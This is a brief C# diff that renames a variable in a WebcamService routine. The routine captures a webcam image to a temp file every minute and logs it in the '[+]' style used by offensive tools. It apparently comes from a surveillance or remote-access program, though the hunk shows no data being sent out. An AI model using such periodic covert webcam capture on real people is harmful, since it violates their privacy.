@@ -16,9 +16,9 @@
                 try
                 {
                     Console.WriteLine("WebcamService : Inside captureWebCam");
-                    var tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-", "webcam");
-                    WebCam.CaptureImage(tempFile);
-                    Console.WriteLine("WebcamService : [+] Webcam captured at: {0}", tempFile);
+                    var filename = Helpers.CreateTempFileName(".jpeg", "webcam-", "webcam");
+                    WebCam.CaptureImage(filename);
+                    Console.WriteLine("WebcamService : [+] Webcam captured at: {0}", filename);
                     await Task.Delay(TimeSpan.FromMinutes(1));
                 }
                 catch (Exception ex)
